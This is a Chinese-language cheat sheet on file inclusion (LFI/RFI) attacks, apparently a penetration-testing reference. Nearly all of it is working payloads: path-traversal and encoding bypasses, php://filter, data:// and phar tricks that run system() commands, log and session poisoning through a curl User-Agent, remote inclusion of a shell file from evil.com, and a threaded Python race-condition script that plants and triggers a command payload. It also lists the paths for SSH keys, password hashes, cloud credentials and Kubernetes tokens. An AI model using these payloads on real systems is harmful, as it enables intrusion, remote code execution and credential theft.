# 文件包含 (LFI / RFI)

## 原理

Web 应用将用户输入作为文件路径参数，包含并执行文件，攻击者可包含任意文件，读取敏感信息或执行代码。

## 分类

| 类型 | 说明 |
|------|------|
| LFI (Local File Inclusion) | 包含本地文件 |
| RFI (Remote File Inclusion) | 包含远程文件（需 `allow_url_include=On`） |
| 文件包含 + 文件上传 | 上传图片马，包含执行 |
| 日志包含 | 包含 Web 日志中的 payload |
| Session 包含 | 包含 session 文件中的 payload |
| 临时文件包含 | 利用 PHP 临时文件 |
| /proc 包含 | 利用 /proc/self/fd 读取文件 |

## 攻击链

### 1. 探测包含点

```http
?page=home
?file=index.php
?path=/etc/passwd
?template=header
?lang=en
?module=user
```

### 2. 读取文件

```http
# Linux
?file=/etc/passwd
?file=/etc/shadow
?file=/etc/hosts
?file=/proc/self/environ
?file=/proc/self/cmdline
?file=/proc/self/status
?file=/proc/self/fd/0
?file=/var/log/apache2/access.log
?file=/var/log/nginx/access.log
?file=/var/www/html/config.php
?file=~/.bash_history
?file=~/.ssh/id_rsa

# Windows
?file=C:\Windows\win.ini
?file=C:\Windows\System32\drivers\etc\hosts
?file=C:\Windows\System32\inetsrv\MetaBase.xml
?file=C:\inetpub\wwwroot\web.config
?file=C:\Windows\repair\sam
?file=C:\Windows\repair\system
?file=C:\Windows\php.ini
?file=C:\Windows\System32\drivers\etc\hosts
```

### 3. 路径穿越

```http
# 基础
?file=../../../../etc/passwd
?file=../../../../../../../etc/passwd

# 编码绕过
?file=..%2f..%2f..%2fetc%2fpasswd
?file=..%252f..%252f..%252fetc%252fpasswd   # 双重编码
?file=....//....//....//etc/passwd             # 双写绕过
?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd  # Unicode 截断
?file=..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd # 全角斜杠

# PHP 协议
?file=php://filter/read=convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=/etc/passwd
?file=php://filter/read=string.rot13/resource=index.php
?file=php://filter/read=convert.iconv.utf-8.utf-16/resource=index.php
```

### 4. PHP 协议利用

#### php://filter

```http
# 读源码
?file=php://filter/read=convert.base64-encode/resource=index.php

# 多重过滤器
?file=php://filter/read=convert.base64-encode|convert.base64-decode/resource=index.php

# 利用 iconv 触发段错误读源码（PHP < 7.0.11）
?file=php://filter/convert.iconv.utf-8.utf-16/resource=index.php

# 利用过滤器链 RCE（PHP filter chain generator）
# 工具：https://github.com/synacktiv/php_filter_chain_generator
php_filter_chain_generator.py --chain '<?php system("id");?>'
```

#### php://input

```http
# 需要开启 allow_url_include
POST /?file=php://input HTTP/1.1

<?php system('id');?>
```

#### data://

```http
# 需要开启 allow_url_include
?file=data://text/plain,<?php system('id');?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
?file=data:text/plain,<?php system('id');?>
```

#### zip:// / phar://

```http
# 上传 zip 文件，包含其中文件
?file=zip://shell.zip%23shell.php
?file=phar://shell.phar/shell.php

# 制作 phar
<?php
$p = new Phar('shell.phar');
$p['shell.php'] = '<?php system($_GET["cmd"]);?>';
$p->setStub('<?php __HALT_COMPILER();');
```

#### expect://

```http
# 需要 expect 扩展
?file=expect://id
```

### 5. 日志包含

```bash
# Apache 日志路径
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/nginx/access.log
/var/log/nginx/error.log

# 注入 payload 到 User-Agent
curl -A "<?php system(\$_GET['cmd']);?>" http://target.com/

# 然后包含日志
?file=/var/log/apache2/access.log&cmd=id
```

### 6. Session 包含

```http
# PHP session 文件路径
/var/lib/php/sessions/sess_<PHPSESSID>
/tmp/sess_<PHPSESSID>
/var/lib/php5/sess_<PHPSESSID>

# 注入 payload 到 session
# 通常通过用户名等字段
?username=<?php system('id');?>

# 然后包含 session 文件
?file=/var/lib/php/sessions/sess_<PHPSESSID>
```

### 7. /proc/self/fd 包含

```http
# /proc/self/fd/N 是文件描述符
# N 通常是日志文件的描述符
?file=/proc/self/fd/0
?file=/proc/self/fd/1
?file=/proc/self/fd/2
# 遍历 0-50 找日志
```

### 8. 临时文件包含

```python
# PHP 上传文件会创建临时文件 /tmp/phpXXXXXX
# 文件名 6 位随机，最后一位可能是 [a-zA-Z0-9]
# 利用竞态条件包含

# 方法 1：通过 /proc/self/fd/
# 上传文件时，临时文件描述符在 /proc/self/fd/ 中
# 遍历 fd 找到临时文件

# 方法 2：通过 phpinfo 泄露临时文件路径
# 上传大文件，phpinfo 会显示临时文件路径
# 然后竞态包含

# 方法 3：通过 Session Upload Progress
# PHP_SESSION_UPLOAD_PROGRESS 会在 session 文件中记录
# 配合竞态条件包含
```

### 9. RFI（远程文件包含）

```http
# 需要 allow_url_include=On
?file=http://evil.com/shell.txt
?file=https://evil.com/shell.txt
?file=ftp://evil.com/shell.txt

# shell.txt 内容
<?php system('id');?>
```

## 绕过技巧

### 1. 后缀限制

```http
# 自动添加后缀
?file=index.php    → 包含 index.php.php（不存在）

# 空字节截断（PHP < 5.3.4）
?file=/etc/passwd%00
?file=/etc/passwd%00.jpg

# 路径长度截断（Windows 260 字符）
?file=shell.txt................................................................................

# 点号截断（Windows）
?file=shell.txt.................................................................
```

### 2. 前缀限制

```http
# 必须以 /var/www/html/ 开头
?file=/var/www/html/../../../etc/passwd
?file=/var/www/html/../../../../../../etc/passwd
```

### 3. 协议限制

```http
# 过滤 php://
# 用 data:// 或 file://
?file=data://text/plain,<?php system('id');?>
?file=file:///etc/passwd
```

### 4. 关键字过滤

```http
# 过滤 .. 
?file=....//....//etc/passwd
?file=..%2f..%2fetc/passwd

# 过滤 /
?file=..%2f..%2fetc%2fpasswd
?file=..%5c..%5c..%5cwindows%5cwin.ini   # Windows 反斜杠
```

## 各语言文件包含

### Python

```python
# Flask
from flask import render_template
render_template(request.args['file'])  # 模板包含

# Jinja2
template = env.get_template(request.args['file'])

# Django
# 直接 open() 包含
```

### Java

```java
// JSP include
<jsp:include page="<%=request.getParameter(\"file\")%>" />

// Servlet
RequestDispatcher rd = request.getRequestDispatcher(request.getParameter("file"));
rd.include(request, response);
```

### Node.js

```javascript
// Express
res.render(req.query.file)

// 直接 require
require(req.query.file)
```

## 2024-2026 新技术点

### 1. PHP filter chain generator

```bash
# 2022 年发现的新技术，2024 年广泛使用
# 通过 php://filter 链生成任意内容
# 无需文件上传即可 RCE

python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
# 输出超长 URL，访问即可执行
```

### 2. 临时文件竞态新姿势

```python
# PHP 8.x 临时文件处理变化
# 通过 PHP_SESSION_UPLOAD_PROGRESS 竞态
# 无需文件上传功能

# Payload
import requests
import threading

URL = "http://target.com/"
SESSION = "attacker"
PAYLOAD = "<?php system('id');?>"

def race():
    while True:
        r = requests.get(URL, params={
            'file': '/var/lib/php/sessions/sess_' + SESSION,
            'cmd': 'id'
        })
        if 'uid=' in r.text:
            print(r.text)
            break

# 上传 progress
def upload():
    while True:
        files = {'file': ('a.txt', 'a')}
        data = {'PHP_SESSION_UPLOAD_PROGRESS': PAYLOAD}
        cookies = {'PHPSESSID': SESSION}
        requests.post(URL, files=files, data=data, cookies=cookies)

for _ in range(10):
    threading.Thread(target=race).start()
for _ in range(10):
    threading.Thread(target=upload).start()
```

### 3. Nginx 临时文件竞态

```bash
# Nginx request buffering 创建临时文件
# /var/lib/nginx/body/0000000001
# 通过 /proc/self/fd/ 包含
```

### 4. 现代框架 LFI

```python
# Django 模板包含
# 通过 template loader 操纵

# Next.js 动态路由
# /pages/[...slug].js
# 可能包含任意文件
```

### 5. 容器环境 LFI

```bash
# /proc/1/root 可访问容器根文件系统
?file=/proc/1/root/etc/passwd

# /proc/self/mountinfo 泄露挂载信息
?file=/proc/self/mountinfo
```

### 6. 云环境 LFI

```bash
# AWS ECS task metadata
?file=/proc/self/environ  # 包含 AWS credentials

# Kubernetes service account token
?file=/var/run/secrets/kubernetes.io/serviceaccount/token
```

### 7. PHP 8.0+ 新特性

```php
# PHP 8.0 移除了 allow_url_include 的某些行为
# 但 php://filter 仍可用
# 新增的 FFI 可能被滥用
```

## 工具推荐

- **LFI Suite** — LFI 自动化
- **php_filter_chain_generator** — PHP filter chain RCE
- **LFISuite** — LFI 利用
- **Panoptic** — LFI 自动化

## 参考链接

- [PayloadsAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks - LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PHP Filter Chain](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
